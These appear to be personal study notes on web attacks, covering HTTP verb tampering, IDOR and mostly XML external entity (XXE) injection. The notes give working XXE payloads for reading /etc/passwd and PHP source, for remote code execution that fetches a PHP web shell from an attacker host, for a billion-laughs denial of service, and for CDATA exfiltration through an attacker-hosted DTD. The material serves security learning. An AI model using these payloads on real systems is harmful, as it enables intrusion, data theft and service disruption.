# WEB ATTACKS
## HTTP Verb Tampering
- Bypassing Basic Authentication
  - Change the Method to bypass the authentication checks
- Bypassing Security Filters
  - Change the Method to bypass teh injection or special charater checks
 
## IDOR
- IDOR Information Disclosure vulnerability
- IDOR Insecure Function Calls

## XXE

| Key	| Definition	| Example |
| --- | --- | --- |
| Tag	| The keys of an XML document, usually wrapped with (</>) characters. |	`<date/>` |
| Entity |	XML variables, usually wrapped with (&/;) characters.	| `&lt;` |
| Element	| The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.	| `<date>01-01-2022</date>` |
| Attribute	| Optional specifications for any element that are stored in the tags, which may be used by the XML parser. |	`version="1.0"/encoding="UTF-8"` |
| Declaration |	Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.	| `<?xml version="1.0" encoding="UTF-8"?>` |

### XML DTD
- XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure.
- The pre-defined document structure can be defined in the document itself or in an external file
- ```XXE
  <!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
  ]>
  ```
  - As we can see, the DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).
 
- it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email SYSTEM "email.dtd">
  ```
- also possible to reference a DTD through a URL
  ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
  ```
### XML Entities
- define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword
   ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email [
    <!ENTITY company "Inlane Freight">
  ]>
  ```
- Reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path
   ```
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "http://localhost/company.txt">
    <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
  ]>
  ```
  - also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards

- Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
  ##### Reading Sensitive Files
  ```
  <!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
  ]>
  ```
  ##### Reading Source Code
  ```
  <!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
  ]>
  ```
  ##### Remote Code Execution with XXE
  ```
  $ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
  $ sudo python3 -m http.server 80
  ```
  ```
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
  ]>
  <root>
  <name></name>
  <tel></tel>
  <email>&company;</email>
  <message></message>
  </root>
  ```
    - replaced all spaces in the above XML code with $IFS to avliid breaking
  ##### Billon laugh
  ```
  <?xml version="1.0"?>
  <!DOCTYPE email [
    <!ENTITY a0 "DOS" >
    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
  ]>
  <root>
  <name></name>
  <tel></tel>
  <email>&a10;</email>
  <message></message>
  </root>
  ```
   - However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference
 
  ##### Advanced Exfiltration with CDATA
  - To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag `<![CDATA[ FILE_CONTENT ]]>)`
      -The XML parser would consider this part raw data, which may contain any type of data, including any special characters.
      - ```
        <!DOCTYPE email [
        <!ENTITY begin "<![CDATA[">
        <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
        <!ENTITY end "]]>">
        <!ENTITY joined "&begin;&file;&end;">
        ]>
        ```
        this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
        
        To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is            that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined:
        ```
          <!ENTITY joined "%begin;%file;%end;">
          ```
        host it on our machine, and then reference it as an external entity on the target web application:
        ```
        echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
        $ python3 -m http.server 8000
        
        Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) 
        ```
        reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:

        ```xml
          <!DOCTYPE email [
            <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
            <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
            <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
            <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
            %xxe;
          ]>
          ...
          <email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
        ```
    ##### Tool
    https://github.com/enjoiz/XXEinjector.git
